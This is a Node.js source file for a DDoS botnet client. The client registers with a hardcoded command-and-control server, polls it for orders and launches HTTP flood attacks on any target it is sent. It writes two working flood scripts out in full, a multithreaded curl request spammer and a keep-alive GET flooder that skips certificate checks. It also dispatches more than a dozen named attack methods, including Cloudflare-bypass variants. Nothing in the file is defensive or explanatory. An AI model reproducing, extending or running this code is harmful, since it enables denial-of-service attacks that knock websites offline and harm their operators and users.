const express = require('express');
const { exec, spawn } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// ========== GENERATE UNIQUE BOT ID ==========
function generateBotId() {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(8).toString('hex');
    const pid = process.pid.toString(36);
    return `bot-${random}-${timestamp.slice(-6)}-${pid}`;
}

// ========== CONFIGURATION ==========
const BOT_ID = generateBotId();
const BOT_NAME = process.env.BOT_NAME || `Bot-${Math.floor(Math.random() * 10000)}`;
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://hello-kutty-k7d3.onrender.com';
const PORT = 0; // random port

let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = [];
let isBlocked = false;
let botUrl = '';
let serverPort = 0;

console.log(`\n${'='.repeat(60)}`);
console.log(`🤖 BOT STARTING`);
console.log(`${'='.repeat(60)}`);
console.log(`🆔 Bot ID: ${BOT_ID}`);
console.log(`📛 Bot Name: ${BOT_NAME}`);
console.log(`📡 Master Server: ${MASTER_SERVER}`);
console.log(`${'='.repeat(60)}\n`);

// ========== ENSURE METHODS ==========
function ensureMethods() {
    const methodsDir = path.join(__dirname, 'methods');
    if (!fs.existsSync(methodsDir)) {
        fs.mkdirSync(methodsDir, { recursive: true });
        console.log('[SETUP] Created methods directory');
    }

    // Create curl-stress.js
    const stressPath = path.join(methodsDir, 'curl-stress.js');
    if (!fs.existsSync(stressPath)) {
        const stressContent = `#!/usr/bin/env node
const { spawn } = require('child_process');

const TARGET = process.argv[2];
const TIME = parseInt(process.argv[3]) || 60;
const THREADS = 90;

if (!TARGET) {
    console.log('Usage: node curl-stress.js <target> <time>');
    process.exit(1);
}

console.log(\`\\n🔥 CURL STRESS FLOOD | \${TARGET} | \${TIME}s | \${THREADS} threads\\n\`);

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

let totalSent = 0;
let completedThreads = 0;
const startTime = Date.now();

function stressThread(threadId) {
    const ua = userAgents[threadId % userAgents.length];
    let running = true;
    let sent = 0;
    
    const sendSpam = () => {
        if (!running) return;
        
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(7);
        const url = \`\${TARGET}?t=\${timestamp}&r=\${random}&tid=\${threadId}\`;
        
        const args = [
            '-s', '-o', '/dev/null',
            '-H', \`User-Agent: \${ua}\`,
            '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            '-H', 'Accept-Language: en-US,en;q=0.9',
            '-H', 'Accept-Encoding: gzip, deflate, br',
            '-H', 'Connection: keep-alive',
            '-H', 'Cache-Control: no-cache, no-store, must-revalidate',
            '--compressed',
            '--tcp-fastopen',
            '--connect-timeout', '2',
            '--max-time', '3',
            '--retry', '0',
            url
        ];
        
        const proc = spawn('curl', args, {
            detached: true,
            stdio: 'ignore'
        });
        proc.unref();
        sent++;
        totalSent++;
        
        if (running) {
            setImmediate(sendSpam);
        }
    };
    
    for (let i = 0; i < 10; i++) {
        sendSpam();
    }
    
    setTimeout(() => {
        running = false;
        completedThreads++;
        if (completedThreads === THREADS) {
            const elapsed = (Date.now() - startTime) / 1000;
            console.log(\`\\n✅ STRESS COMPLETE | Total: \${totalSent} | RPS: \${(totalSent/elapsed).toFixed(0)}\\n\`);
            process.exit(0);
        }
    }, TIME * 1000);
}

for (let i = 0; i < THREADS; i++) {
    stressThread(i + 1);
}

setTimeout(() => {
    if (completedThreads < THREADS) {
        process.exit(0);
    }
}, TIME * 1000 + 3000);`;
        fs.writeFileSync(stressPath, stressContent);
        console.log('[SETUP] Created curl-stress.js');
    }

    // Create raw-get.js
    const rawGetPath = path.join(methodsDir, 'raw-get.js');
    if (!fs.existsSync(rawGetPath)) {
        const rawGetContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const url = require('url');

const TARGET = process.argv[2];
const TIME = parseInt(process.argv[3]) || 60;
const THREADS = parseInt(process.argv[4]) || 20;
const RATE = parseInt(process.argv[5]) || 100;

if (!TARGET) {
    console.log('Usage: node raw-get.js <target> <time> [threads] [rate]');
    process.exit(1);
}

const parsed = new URL(TARGET);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

console.log(\`\\n🔥 RAW-GET | \${TARGET} | \${TIME}s | \${THREADS} threads | \${RATE} req/s\\n\`);

let totalSent = 0;
let completed = 0;

function sendRequests(threadId) {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    const intervalMs = 1000 / RATE;
    
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; totalSent++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setTimeout(sendRequest, intervalMs);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setTimeout(() => {
        running = false;
        completed++;
        if (completed === THREADS) {
            console.log(\`\\n✅ RAW-GET COMPLETE | Total: \${totalSent}\\n\`);
            process.exit(0);
        }
    }, TIME * 1000);
}

for (let i = 0; i < THREADS; i++) {
    setTimeout(() => sendRequests(i + 1), i * 10);
}`;
        fs.writeFileSync(rawGetPath, rawGetContent);
        console.log('[SETUP] Created raw-get.js');
    }
}

ensureMethods();

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        botId: BOT_ID,
        botName: BOT_NAME,
        timestamp: Date.now(),
        master: MASTER_SERVER,
        uptime: process.uptime(),
        activeAttacks: activeProcesses.length
    });
});

app.get('/ping', (req, res) => {
    res.json({
        alive: true,
        botId: BOT_ID,
        uptime: process.uptime(),
        timestamp: Date.now(),
        status: 'online'
    });
});

app.get('/attack', (req, res) => {
    const { target, time, methods } = req.query;
    if (!target || !time || !methods) {
        return res.status(400).json({ error: 'Missing parameters' });
    }
    console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);
    res.status(200).json({ message: 'Attack command received', target, time, methods });
    executeAttack(target, time, methods);
});

// ========== START SERVER ==========
const server = app.listen(PORT, () => {
    const address = server.address();
    serverPort = address.port;
    botUrl = `http://localhost:${serverPort}`;
    console.log(`[INFO] Bot server running on port ${serverPort}`);
    console.log(`[INFO] Bot URL: ${botUrl}`);
    console.log(`[INFO] Bot ID: ${BOT_ID}`);
    console.log(`[INFO] Bot Name: ${BOT_NAME}\n`);
    setTimeout(() => {
        autoRegister();
    }, 2000);
});

// ========== AUTO-REGISTER ==========
async function autoRegister() {
    if (isBlocked) {
        console.log(`[BLOCKED] This bot has been permanently blocked`);
        process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
        console.log(`[WARN] Max registration attempts. Retry in 60s...`);
        setTimeout(() => {
            registrationAttempts = 0;
            autoRegister();
        }, 60000);
        return;
    }

    try {
        console.log(`[INFO] Registering... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`);
        console.log(`[INFO] Bot ID: ${BOT_ID}`);
        console.log(`[INFO] Bot Name: ${BOT_NAME}`);
        
        const response = await axios.post(`${MASTER_SERVER}/register`, {
            id: BOT_ID,
            name: BOT_NAME,
            url: botUrl
        }, {
            timeout: 10000,
            headers: { 'Content-Type': 'application/json' }
        });

        if (response.data && response.data.approved) {
            console.log(`[SUCCESS] ✅ Registered!`);
            console.log(`[INFO] Bot ID: ${BOT_ID}`);
            console.log(`[INFO] Ready for commands!\n`);
            
            // Start command polling
            setInterval(() => {
                checkForCommands();
            }, 3000);

            // Start heartbeat every 25 seconds to keep connection alive
            setInterval(() => {
                sendHeartbeat();
            }, 25000);
            
            return;
        } else {
            registrationAttempts++;
            setTimeout(() => autoRegister(), 5000);
        }
    } catch (error) {
        if (error.response && error.response.status === 403) {
            console.log(`[BLOCKED] Bot is blocked!`);
            isBlocked = true;
            process.exit(0);
            return;
        }
        registrationAttempts++;
        console.error(`[ERROR] Registration failed: ${error.message}`);
        setTimeout(() => autoRegister(), 5000);
    }
}

// ========== SEND HEARTBEAT ==========
async function sendHeartbeat() {
    try {
        await axios.post(`${MASTER_SERVER}/heartbeat`, { id: BOT_ID }, { timeout: 5000 });
        // Optional: log heartbeat (too noisy)
        // console.log(`[HEARTBEAT] Sent`);
    } catch (error) {
        // Silently fail
    }
}

// ========== CHECK COMMANDS ==========
async function checkForCommands() {
    try {
        const response = await axios.get(`${MASTER_SERVER}/get-command`, {
            params: { botId: BOT_ID },
            timeout: 5000
        });

        if (response.data && response.data.hasCommand) {
            const command = response.data.command;
            if (command.action === 'stop') {
                console.log(`\n[STOP] Stopping all attacks`);
                stopAllAttacks();
            } else if (command.action === 'attack') {
                const { target, time, methods } = command;
                console.log(`\n[COMMAND] ${methods} -> ${target} for ${time}s`);
                executeAttack(target, time, methods);
            }
        }
    } catch (error) {
        // Silently fail
    }
}

// ========== STOP ALL ==========
function stopAllAttacks() {
    console.log(`[STOP] Killing ${activeProcesses.length} processes`);
    activeProcesses.forEach(proc => {
        try { process.kill(-proc.pid); } catch (e) {}
    });
    activeProcesses = [];
}

// ========== EXECUTE ATTACK ==========
function executeAttack(target, time, methods) {
    const execWithLog = (cmd) => {
        console.log(`[EXEC] ${cmd}`);
        const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
            if (error) console.error(`[ERROR] ${error.message}`);
            if (stdout) console.log(`[OUTPUT] ${stdout}`);
            if (stderr) console.error(`[STDERR] ${stderr}`);
        });
        activeProcesses.push(proc);
        setTimeout(() => {
            const index = activeProcesses.indexOf(proc);
            if (index > -1) activeProcesses.splice(index, 1);
        }, parseInt(time) * 1000 + 5000);
    };

    console.log(`\n[ATTACK] Method: ${methods} | Target: ${target} | Time: ${time}s`);
    console.log('='.repeat(60));

    const methodsDir = path.join(__dirname, 'methods');

    switch(methods) {
        case 'RAW-GET':
            execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 20 100`);
            break;
        case 'CF-BYPASS':
            execWithLog(`node ${path.join(methodsDir, 'cf-bypass.js')} ${target} ${time} 4 32`);
            break;
        case 'MODERN-FLOOD':
            execWithLog(`node ${path.join(methodsDir, 'modern-flood.js')} ${target} ${time} 4 64`);
            break;
        case 'BYPASS':
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            break;
        case 'VHOLD':
            execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2`);
            break;
        case 'W-FLOOD':
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3`);
            break;
        case 'STRESS':
        case 'CURL-SPAM':
            execWithLog(`node ${path.join(methodsDir, 'curl-stress.js')} ${target} ${time}`);
            break;
        case 'RAPID10':
        case 'R10':
            execWithLog(`node ${path.join(methodsDir, 'r10-rapid.js')} ${target} ${time} 30`);
            execWithLog(`node ${path.join(methodsDir, 'r10-tcp.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-tls.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-conn.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-header.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-frag.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-pipe.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-cookie.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-mixed.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-lowcpu.js')} ${target} ${time}`);
            break;
        case 'HTTP-SICARIO':
            execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            break;
        case 'RAW-HTTP':
            execWithLog(`node ${path.join(methodsDir, 'h2-nust.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'http-panel.js')} ${target} ${time}`);
            break;
        case 'R9':
            execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3`);
            execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            break;
        case 'PRIV-TOR':
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 64 6`);
            execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            break;
        case 'HOLD-PANEL':
            execWithLog(`node ${path.join(methodsDir, 'http-panel.js')} ${target} ${time}`);
            break;
        case 'R1':
            execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2`);
            execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            break;
        case 'UAM':
            execWithLog(`node ${path.join(methodsDir, 'uam.js')} ${target} ${time}`);
            break;
        case 'W.I.L':
            execWithLog(`node ${path.join(methodsDir, 'wil.js')} ${target} ${time}`);
            break;
        default:
            console.log(`[ERROR] Unknown method: ${methods}`);
            console.log(`[INFO] Available: RAW-GET, CF-BYPASS, MODERN-FLOOD, BYPASS, VHOLD, W-FLOOD, STRESS, RAPID10, R10, HTTP-SICARIO, RAW-HTTP, R9, PRIV-TOR, HOLD-PANEL, R1, UAM, W.I.L`);
    }

    console.log('='.repeat(60));
    console.log(`[ATTACK] ${methods} started on ${target}\n`);
}

// ========== SHUTDOWN ==========
process.on('SIGINT', () => {
    console.log('\n[SHUTDOWN] Cleaning up...');
    stopAllAttacks();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n[SHUTDOWN] Cleaning up...');
    stopAllAttacks();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

console.log('[INFO] Bot initialized. Waiting for server to start...\n');
